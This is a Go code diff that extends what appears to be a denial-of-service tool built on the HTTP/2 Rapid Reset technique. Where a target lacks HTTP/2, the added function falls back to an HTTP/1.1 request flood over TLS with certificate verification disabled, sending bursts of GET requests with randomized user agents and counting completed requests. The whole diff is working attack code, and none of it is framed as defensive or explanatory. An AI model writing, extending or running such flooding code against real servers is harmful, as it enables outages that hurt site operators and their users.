@@ -153,8 +153,9 @@ func burstRapidReset(host, port, path string, deadline time.Time) error {
 
 	state := tlsConn.ConnectionState()
 	if state.NegotiatedProtocol != "h2" {
+		// Fallback: Server doesn't support HTTP/2, use HTTP/1.1 flood instead
 		tlsConn.Close()
-		return fmt.Errorf("server does not support HTTP/2 (got: %s)", state.NegotiatedProtocol)
+		return fallbackHTTP1Flood(rawConn, host, port, path, deadline)
 	}
 
 	defer tlsConn.Close()
@@ -270,4 +271,53 @@ func burstRapidReset(host, port, path string, deadline time.Time) error {
 
 // Helper: discard bytes
 var _ = io.Discard
+
+// Fallback to HTTP/1.1 flood when HTTP/2 not supported
+func fallbackHTTP1Flood(rawConn net.Conn, host, port, path string, deadline time.Time) error {
+	// Reopen connection since we closed TLS
+	rawConn.Close()
+	
+	dialer := &net.Dialer{Timeout: 5 * time.Second}
+	conn, err := dialer.Dial("tcp", host+":"+port)
+	if err != nil {
+		return fmt.Errorf("fallback dial: %w", err)
+	}
+	defer conn.Close()
+
+	if tcpConn, ok := conn.(*net.TCPConn); ok {
+		tcpConn.SetNoDelay(true)
+		tcpConn.SetKeepAlive(true)
+	}
+
+	tlsConn := tls.Client(conn, &tls.Config{
+		InsecureSkipVerify: true,
+		ServerName:         host,
+	})
+	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
+	if err := tlsConn.Handshake(); err != nil {
+		return fmt.Errorf("fallback handshake: %w", err)
+	}
+	tlsConn.SetDeadline(time.Time{})
+
+	// Send rapid HTTP/1.1 requests
+	for i := 0; i < 100 && time.Now().Before(deadline); i++ {
+		if atomic.LoadInt32(&stopFlag) == 1 {
+			return nil
+		}
+
+		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n",
+			path, host, randomUA())
+		
+		tlsConn.SetWriteDeadline(time.Now().Add(2 * time.Second))
+		_, err := tlsConn.Write([]byte(req))
+		if err != nil {
+			return err
+		}
+
+		atomic.AddInt64(&metrics.TotalRequests, 1)
+		atomic.AddInt64(&metrics.Completed, 1)
+	}
+
+	return nil
+}
 
